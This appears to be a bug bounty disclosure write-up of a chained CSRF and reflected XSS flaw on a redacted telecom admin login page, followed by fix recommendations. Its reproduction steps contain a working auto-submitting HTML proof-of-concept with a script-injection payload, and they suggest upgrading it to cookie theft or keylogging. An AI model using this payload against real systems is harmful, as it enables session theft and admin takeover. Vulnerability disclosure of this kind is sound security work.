# CVE-Class: Chained CSRF → Reflected XSS on Admin Login Panel

**Program:** Private Bug Bounty Program (Telecom Provider)  
**Vulnerability Class:** Reflected Cross-Site Scripting (XSS) via Cross-Site Request Forgery (CSRF)  
**Endpoint Type:** Admin CMS Login Page (`/admin/login/index.php`)  
**OWASP 2021:** A3 – Injection  
**CVSS v3.1 Score:** 9.3 (Critical)  
**Status:** Hall of Fame — Accepted & Rewarded  
**Discovery Date:** Q1 2025

---

## TL;DR

The admin panel login form for a large European telecom provider lacked CSRF protections and reflected user input unsanitized in server responses. By chaining these two weaknesses, I escalated a Self-XSS (normally unexploitable) into a fully weaponized Reflected XSS deliverable via a single link — with no authentication required from the attacker.

---

## Vulnerability Details

| Field | Value |
|---|---|
| Endpoint Type | Admin CMS Login (`POST`) |
| Vulnerable Parameter | `username` field (dynamically named) |
| Authentication Required | None |
| User Interaction | One click on attacker-crafted link |
| Scope | Admin panel of production web application |

### Root Cause

Two independent weaknesses combined:

1. **Missing CSRF token** — The login form had no server-side mechanism to verify that a POST submission originated from the legitimate login page. Any page on the internet could submit the form on a visitor's behalf.

2. **Unsanitized reflection** — The value supplied in the `username` field was reflected verbatim in the HTTP response body without HTML encoding, allowing injected markup and script to execute in the browser.

Individually, neither issue achieves full exploitability. Together, they create a one-click critical.

---

## CVSS v3.1 Breakdown

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector (AV) | Network | Fully remote, no physical access |
| Attack Complexity (AC) | Low | No race conditions or special preconditions |
| Privileges Required (PR) | None | Attacker needs no account |
| User Interaction (UI) | Required | Victim must click one link |
| Scope (S) | **Changed** | XSS crosses from attacker's origin into target's origin |
| Confidentiality (C) | High | Session tokens, admin cookies accessible |
| Integrity (I) | High | Full page control; admin actions possible |
| Availability (A) | None | No DoS component |
| **Base Score** | **9.3 — Critical** | |

> Scope: Changed is the key driver here. Because the XSS executes under the target domain's origin, it breaks the browser's same-origin boundary — meaning the impact extends beyond what the attacker directly controls.

---

## Attack Chain

```
[Attacker]
    │
    │  1. Hosts malicious HTML page with auto-submitting form
    │     containing XSS payload in username field
    │
    ▼
[Victim visits attacker's page]
    │
    │  2. Browser auto-POSTs forged request to target admin login
    │     (no CSRF token to block it)
    │
    ▼
[Target Server]
    │
    │  3. Reflects username value into response HTML
    │     without sanitization
    │
    ▼
[Victim's Browser]
    │
    │  4. Injected script executes under target's origin
    │
    ▼
[Attacker achieves XSS on target.com]
```

---

## Reproduction Steps

> **Note:** Domain and application-specific identifiers have been redacted. The `[TARGET]` placeholder represents the affected admin panel origin.

**Step 1.** Identify the login form endpoint and observe that it accepts a POST with a `username` parameter. Note that no CSRF token is present in the form or validated server-side.

**Step 2.** Confirm the reflection. Submit the following value in the `username` field via a direct POST:
```
test123"><h1>INJECTED</h1>
```
If the string `<h1>INJECTED</h1>` appears rendered in the response, unsanitized reflection is confirmed.

**Step 3.** Craft the CSRF exploit page. Save the following as `poc.html` and host it on any HTTP server:

```html
<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
  <form action="https://[TARGET]/admin/login/" method="POST" id="f">
    <input type="hidden" name="username_fieldname" value="username_[RANDOMIZED]">
    <input type="hidden" name="username_[RANDOMIZED]"
           value='"><script>alert(document.domain)</script>'>
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

**Step 4.** Send the URL of `poc.html` to a victim. When they open it, the form submits automatically, the XSS payload is reflected, and `alert(document.domain)` fires on the target's origin — confirming execution.

**Step 5.** Replace the `alert()` with any JavaScript payload (e.g., cookie exfiltration, keylogger, redirect to phishing page).

---

## Observed Response (Redacted)

The server returned HTTP 200 with the injected content rendered inline in the HTML body, confirming reflection without sanitization. Response headers included no `Content-Security-Policy`.

---

## Fix Recommendations

### 1. CSRF Token Implementation (Primary Fix)
Generate a cryptographically random, per-session token server-side and include it as a hidden field in every form. Validate it on every POST — reject requests missing a valid token with a 403.

```html
<input type="hidden" name="csrf_token" value="[SERVER_GENERATED_TOKEN]">
```

### 2. Output Encoding (Primary Fix)
All user-supplied values reflected in HTML responses must be encoded using context-appropriate escaping. In an HTML context, at minimum encode:

| Character | Encoded Form |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

Use a well-tested sanitization library rather than manual replacement.

### 3. SameSite Cookie Attribute
Set `SameSite=Strict` or `SameSite=Lax` on all session cookies. This acts as a second line of defense against CSRF even when tokens are absent.

### 4. Content Security Policy
Deploy a `Content-Security-Policy` header restricting script sources. A strict CSP (e.g., nonce-based) would have broken this chain even with the XSS present.

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-{RANDOM}'
```

---

## Key Takeaway

This finding demonstrates a common pattern in web security: **two low-to-medium severity issues combining into a critical**. Neither CSRF on a login form nor Self-XSS is typically accepted by most programs in isolation. Recognizing that CSRF is the delivery mechanism that promotes Self-XSS to Reflected XSS is what elevated this to Hall of Fame.
